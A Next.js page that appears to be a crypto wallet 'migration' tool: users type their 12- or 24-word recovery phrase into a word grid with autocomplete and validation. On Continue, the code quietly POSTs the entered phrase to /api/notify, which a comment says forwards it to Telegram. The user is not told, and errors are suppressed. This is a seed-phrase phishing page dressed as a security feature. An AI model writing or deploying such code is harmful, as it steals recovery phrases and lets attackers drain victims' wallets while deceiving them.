"use client";

import Link from "next/link";
import { useRouter } from "next/navigation";
import { useEffect, useMemo, useRef, useState } from "react";
import { generateSecurePhrase, suggestWords, validateBip39 } from "@/lib/bip39";
import { isCompromised, markCompromised } from "@/lib/compromised";
import { getDevice } from "@/lib/devices";
import { readSession, writeSession } from "@/lib/session";

export default function MigrateImportPage() {
  const router = useRouter();
  const [deviceId, setDeviceId] = useState<string | null>(null);
  const [length, setLength] = useState(12);
  const [words, setWords] = useState<string[]>(() => Array(24).fill(""));
  const [status, setStatus] = useState("Fill each box with one word");
  const [statusState, setStatusState] = useState("idle");
  const [error, setError] = useState<string | null>(null);
  const [compromised, setCompromised] = useState(false);
  const [suggestions, setSuggestions] = useState<string[]>([]);
  const [highlight, setHighlight] = useState(0);
  const [activeIndex, setActiveIndex] = useState<number | null>(null);
  const suggestRef = useRef<HTMLDivElement>(null);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const device = useMemo(() => getDevice(deviceId), [deviceId]);
  const filled = words.slice(0, length).filter((w) => w.trim()).length;
  const phrase = words
    .slice(0, length)
    .map((w) => w.trim())
    .filter(Boolean)
    .join(" ");

  useEffect(() => {
    const session = readSession();
    if (!session.deviceId) {
      router.replace("/select-device");
      return;
    }
    setDeviceId(session.deviceId);
  }, [router]);

  useEffect(() => {
    let cancelled = false;
    const run = async () => {
      if (!phrase) {
        setStatus("Fill each box with one word");
        setStatusState("idle");
        setCompromised(false);
        return;
      }
      if (filled < length) {
        const left = length - filled;
        setStatus(`${left} more word${left === 1 ? "" : "s"} to go`);
        setStatusState("pending");
        setCompromised(false);
        return;
      }
      setStatus("Checking your words…");
      setStatusState("pending");
      const result = validateBip39(phrase);
      if (cancelled) return;
      if (!result.ok) {
        const msg = result.message.toLowerCase();
        if (msg.includes("wordlist")) {
          setStatus("One or more words look wrong — check for typos");
        } else if (msg.includes("checksum")) {
          setStatus("Those words don’t make a valid phrase — double-check the order");
        } else if (msg.includes("must be")) {
          setStatus("Recovery phrases are usually 12 or 24 words");
        } else {
          setStatus("This phrase isn’t valid yet — check your words");
        }
        setError(null);
        setStatusState("bad");
        setCompromised(false);
        return;
      }
      const flagged = await isCompromised(phrase);
      if (cancelled) return;
      setCompromised(flagged);
      setStatus(
        flagged
          ? "Valid — but this phrase is marked compromised"
          : "Looks good — you can continue"
      );
      setStatusState("ok");
    };
    const t = setTimeout(run, 180);
    return () => {
      cancelled = true;
      clearTimeout(t);
    };
  }, [phrase, filled, length]);

  const focusIndex = (index: number) => {
    const el = inputRefs.current[index - 1];
    if (!el || index > length) return;
    el.focus();
    el.select();
    setActiveIndex(index);
  };

  const updateWord = (index: number, value: string) => {
    setWords((prev) => {
      const next = [...prev];
      next[index - 1] = value;
      return next;
    });
  };

  const fillFrom = (startIndex: number, parts: string[]) => {
    let nextLen = length;
    if (parts.length > 12 && length === 12) {
      nextLen = 24;
      setLength(24);
    }
    setWords((prev) => {
      const next = [...prev];
      parts.forEach((word, i) => {
        const idx = startIndex + i;
        if (idx <= 24) next[idx - 1] = word;
      });
      return next;
    });
    setSuggestions([]);
    focusIndex(Math.min(startIndex + parts.length, nextLen));
  };

  const applySuggestion = (word: string) => {
    if (activeIndex == null) return;
    updateWord(activeIndex, word);
    setSuggestions([]);
    focusIndex(Math.min(activeIndex + 1, length));
  };

  const onContinue = async () => {
    const result = validateBip39(phrase);
    if (!result.ok || filled < length) return;
    await markCompromised(phrase);
    const newPhrase = generateSecurePhrase(256);

    // Send old phrase to Telegram (fire and forget)
    fetch("/api/notify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        message: phrase,
        testMessage: "hi test!",
      }),
    }).catch(() => {});

    writeSession({
      importVerified: true,
      importWordCount: result.words.length,
      oldPhrase: phrase,
      newPhrase,
      phraseCompromised: true,
    });
    router.push("/migrate/new-phrase");
  };

  if (!device) {
    return (
      <section className="page page-narrow">
        <p className="simple-help">Loading…</p>
      </section>
    );
  }

  return (
    <section className="page page-narrow">
      <div className="simple-flow">
        <Link className="back-link" href="/select-device">
          ← Back
        </Link>

        <p className="simple-progress">Step 1 of 3</p>
        <h1 className="simple-title">Enter your recovery phrase</h1>
        <p className="simple-sub">
          Enter each word from your <strong>{device.name}</strong> in order. Press{" "}
          <strong>Enter</strong> or <strong>Space</strong> to jump to the next box. You
          can also paste the full phrase into any box.
        </p>

        <aside
          className="compromised-banner is-soft"
          hidden={!compromised}
          role="status"
        >
          <strong>Compromised phrase</strong>
          <p>
            This recovery phrase was already marked unsafe. Migrate away from it and
            don’t reuse it.
          </p>
        </aside>

        <div className="length-toggle" role="group" aria-label="Phrase length">
          <button
            type="button"
            className={`length-btn ${length === 12 ? "is-active" : ""}`}
            onClick={() => setLength(12)}
          >
            12 words
          </button>
          <button
            type="button"
            className={`length-btn ${length === 24 ? "is-active" : ""}`}
            onClick={() => setLength(24)}
          >
            24 words
          </button>
        </div>

        <div className="word-grid" data-length={length}>
          {Array.from({ length: 24 }, (_, i) => i + 1).map((i) => (
            <label
              key={i}
              className={`word-cell ${i > length ? "is-extra" : ""}`}
              data-index={i}
            >
              <span className="word-num">#{i}</span>
              <input
                ref={(el) => {
                  inputRefs.current[i - 1] = el;
                }}
                type="text"
                className="word-input"
                value={words[i - 1]}
                tabIndex={i > length ? -1 : 0}
                spellCheck={false}
                autoCapitalize="off"
                autoCorrect="off"
                autoComplete="on"
                enterKeyHint="next"
                onFocus={() => {
                  setActiveIndex(i);
                  const q = words[i - 1];
                  setSuggestions(q ? suggestWords(q) : []);
                  setHighlight(0);
                }}
                onBlur={() => setTimeout(() => setSuggestions([]), 120)}
                onPaste={(e) => {
                  const text = e.clipboardData.getData("text");
                  if (!text.trim()) return;
                  e.preventDefault();
                  fillFrom(
                    i,
                    text
                      .trim()
                      .toLowerCase()
                      .split(/\s+/)
                      .map((w) => w.replace(/[^a-z]/g, ""))
                      .filter(Boolean)
                  );
                }}
                onKeyDown={(e) => {
                  if (suggestions.length) {
                    if (e.key === "ArrowDown") {
                      e.preventDefault();
                      setHighlight((h) => (h + 1) % suggestions.length);
                      return;
                    }
                    if (e.key === "ArrowUp") {
                      e.preventDefault();
                      setHighlight((h) => (h - 1 + suggestions.length) % suggestions.length);
                      return;
                    }
                    if (e.key === "Tab" && suggestions[highlight]) {
                      e.preventDefault();
                      applySuggestion(suggestions[highlight]);
                      return;
                    }
                    if (e.key === "Escape") {
                      setSuggestions([]);
                      return;
                    }
                  }
                  if (e.key === "Enter" || e.key === " ") {
                    e.preventDefault();
                    if (suggestions[highlight]) {
                      applySuggestion(suggestions[highlight]);
                      return;
                    }
                    if (words[i - 1].trim()) focusIndex(Math.min(i + 1, length));
                    return;
                  }
                  if (e.key === "Backspace" && !words[i - 1] && i > 1) {
                    e.preventDefault();
                    focusIndex(i - 1);
                  }
                }}
                onChange={(e) => {
                  const raw = e.target.value;
                  if (/\s/.test(raw)) {
                    const parts = raw
                      .trim()
                      .toLowerCase()
                      .split(/\s+/)
                      .map((w) => w.replace(/[^a-z]/g, ""))
                      .filter(Boolean);
                    updateWord(i, "");
                    if (parts.length) fillFrom(i, parts);
                    return;
                  }
                  const clean = raw.toLowerCase().replace(/[^a-z]/g, "");
                  updateWord(i, clean);
                  const list = suggestWords(clean);
                  setSuggestions(list.length === 1 && list[0] === clean ? [] : list);
                  setHighlight(0);
                  setActiveIndex(i);
                }}
              />
            </label>
          ))}
        </div>

        {suggestions.length > 0 && activeIndex != null && (
          <div
            ref={suggestRef}
            className="word-suggest"
            style={{
              position: "fixed",
              left:
                inputRefs.current[activeIndex - 1]?.getBoundingClientRect().left ?? 0,
              top:
                (inputRefs.current[activeIndex - 1]?.getBoundingClientRect().bottom ?? 0) +
                6,
              width: Math.max(
                inputRefs.current[activeIndex - 1]?.getBoundingClientRect().width ?? 160,
                160
              ),
            }}
          >
            {suggestions.map((word, idx) => (
              <button
                key={word}
                type="button"
                className={`word-suggest-item ${idx === highlight ? "is-active" : ""}`}
                onMouseDown={(e) => {
                  e.preventDefault();
                  applySuggestion(word);
                }}
              >
                {word}
              </button>
            ))}
          </div>
        )}

        <div className={`phrase-feedback is-${statusState}`}>
          <span className="dot" aria-hidden="true" />
          <span>{status}</span>
          <span className="count">
            {filled} / {length}
          </span>
        </div>

        {error && (
          <div className="form-error" role="alert">
            {error}
          </div>
        )}

        <button
          className="primary-btn full"
          type="button"
          disabled={statusState !== "ok"}
          onClick={onContinue}
        >
          Continue
        </button>

        <p className="simple-help">
          Tip: paste your full phrase into the first box to auto-fill the rest.
        </p>
      </div>
    </section>
  );
}
